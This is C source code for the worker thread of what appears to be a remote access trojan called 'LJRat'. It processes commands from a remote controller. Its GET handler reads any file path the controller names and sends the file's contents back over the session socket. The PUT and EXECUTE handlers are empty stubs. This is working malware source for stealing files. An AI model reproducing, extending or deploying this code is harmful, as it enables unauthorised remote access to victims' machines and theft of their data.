#include "LJRat.h"
#include "worker.h"
#include "list.h"
#include "error.h"
#include "message.h"
#include "debug.h"
#include "session.h"

#define RESULT_CMD_ID 99

extern SESSION_CTX session_ctx;

enum CMD_TYPE {
    GET = 1,
    PUT,
    EXECUTE
};

static ERROR_T ProcessWork(PMESSAGE pMsg);
static ERROR_T GetCmd(PMESSAGE pMsg, PMESSAGE *pResult);
static ERROR_T PutCmd(PMESSAGE pMsg, PMESSAGE *pResult);
static ERROR_T ExecuteCmd(PMESSAGE pMsg, PMESSAGE *pResult);

unsigned int __stdcall WorkerThread(PVOID pArg)
{
    INT iError = E_SUCCESS;
    PLIST_ITEM pItem = NULL;

    while (SHUTDOWN_INITIATED != session_ctx.gShutdown) {

        if (TRUE == SRWListIsEmpty(&session_ctx.job_list)) {
            WaitForSingleObject(session_ctx.hJobWait, INFINITE);
        }

        pItem = (PLIST_ITEM) SRWListRemoveHead(&session_ctx.job_list);
        if (NULL == pItem)
        {
            iError = E_JOB_REMOVE_ERROR;
            goto end;
        }

        ProcessWork((PMESSAGE) pItem->pData);
        HeapFree(GetProcessHeap(), 0, pItem);
        DBG_PRINT("Processed work item\n");
    } 

end:
    return iError;
}

ERROR_T ProcessWork(PMESSAGE pMsg)
{
    INT iError = E_SUCCESS;
    PMESSAGE pResult = NULL;

    DBG_PRINT("Len: %d CMD_TYPE: %d JOB_ID: %d\n", pMsg->hdr.dwMessageSize, pMsg->hdr.dwCommand, pMsg->hdr.dwJobID);

    switch(pMsg->hdr.dwCommand) {
        case GET:
            iError = GetCmd(pMsg, &pResult);
            break;
        case PUT:
            iError = PutCmd(pMsg, &pResult);
            break;
        case EXECUTE:
            iError = ExecuteCmd(pMsg, &pResult);
            break;

        default:
            break;
    }

    // TODO Do something when a critical error happens

    if (E_SUCCESS != iError) {
        DBG_PRINT("Error processing work %d\n", iError);
    }

    iError = MessageSend(session_ctx.sock, pResult);
    if (E_SUCCESS != iError) {
        DBG_PRINT("Error sending results\n");
    }

end:
    MessageFree(&pMsg);    
    return iError;
}

ERROR_T GetCmd(PMESSAGE pMsg, PMESSAGE *pResult) {
    INT iError = E_SUCCESS;
    PDWORD pRemoteFileLen = NULL;
    PCHAR pRemoteFile = NULL;
    PBYTE pFileBuf = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    *pResult = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MESSAGE));
    if (NULL == pResult) {
        iError = E_MEMORY_ERROR;
        goto end;
    }

    pRemoteFileLen = (PDWORD) pMsg->pData;
    pRemoteFile = (PCHAR) ((PBYTE) pMsg->pData + sizeof(DWORD));

    DBG_PRINT("Getting: %s:%d\n", pRemoteFile, *pRemoteFileLen);

    LARGE_INTEGER liFileSize = {0};

    hFile = CreateFileA(pRemoteFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile) {
        printf("%d\n", GetLastError());
        iError = E_GET_READ_ERROR;
        goto end;
    }

    if (0 == GetFileSizeEx(hFile, &liFileSize)) {
        iError = E_GET_SIZE_ERROR;
        goto end;
    }

    if (liFileSize.HighPart > 0) {
        iError = E_GET_SIZE_LARGE;
        goto end;
    }

    DWORD dwBytesRead = 0;
    pFileBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, liFileSize.LowPart);
    if (NULL == pFileBuf) {
        iError = E_MEMORY_ERROR;
        goto end;
    }

    if (0 == ReadFile(hFile, pFileBuf, liFileSize.LowPart, &dwBytesRead, NULL)) {
        iError = E_GET_READ_ERROR;
        goto end;
    }

end:
    if (INVALID_HANDLE_VALUE != hFile) {
        CloseHandle(hFile);
    }

    (*pResult)->hdr.dwCommand = RESULT_CMD_ID;
    (*pResult)->hdr.dwJobID = pMsg->hdr.dwJobID;
    (*pResult)->hdr.dwMessageSize = sizeof(MESSAGE_HEADER);
    (*pResult)->hdr.dwResultCode = iError;

    if (E_SUCCESS == iError) {
        (*pResult)->hdr.dwMessageSize += dwBytesRead;
        (*pResult)->pData = pFileBuf;
    }

    return iError;
}

ERROR_T PutCmd(PMESSAGE pMsg, PMESSAGE *pResult) {
    INT iError = E_SUCCESS;

    *pResult = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MESSAGE));
    if (NULL == pResult) {
        iError = E_MEMORY_ERROR;
        goto end;
    }

end:
    return iError;
}

ERROR_T ExecuteCmd(PMESSAGE pMsg, PMESSAGE *pResult) {
    INT iError = E_SUCCESS;

    *pResult = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MESSAGE));
    if (NULL == pResult) {
        iError = E_MEMORY_ERROR;
        goto end;
    }

end:
    return iError;
}